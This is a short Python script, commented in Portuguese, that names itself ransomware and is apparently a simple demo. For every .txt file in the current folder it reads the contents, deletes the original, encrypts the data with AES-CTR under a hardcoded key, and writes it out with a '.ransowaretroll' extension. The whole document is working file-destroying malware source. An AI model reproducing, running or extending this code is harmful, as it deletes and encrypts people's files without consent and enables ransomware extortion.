import os
import pyaes
import glob

#Itera em todos os arquivos .txt da pasta
for nome in glob.glob('*.txt'):
    with open(f'{nome}', "rb") as f:
        conteudo = f.read()

    #Remove o arquivo depois de abrir e coletar todo o conteúdo
    os.remove(nome)

    #Gera uma chave de criptoggrafia
    key = b"#]>[rNBIoe0R28h@"
    aes = pyaes.AESModeOfOperationCTR(key)
    criptografArquivo = aes.encrypt(conteudo)

    #Gera um novo arquivo criptografado com o mesmo nome porém além da extensão .txt é acompanhado da extensão do ransoware
    novoArquivo = nome + ".ransowaretroll"
    novoArquivo = open(f'{novoArquivo}', 'wb')
    novoArquivo.write(criptografArquivo)
    novoArquivo.close()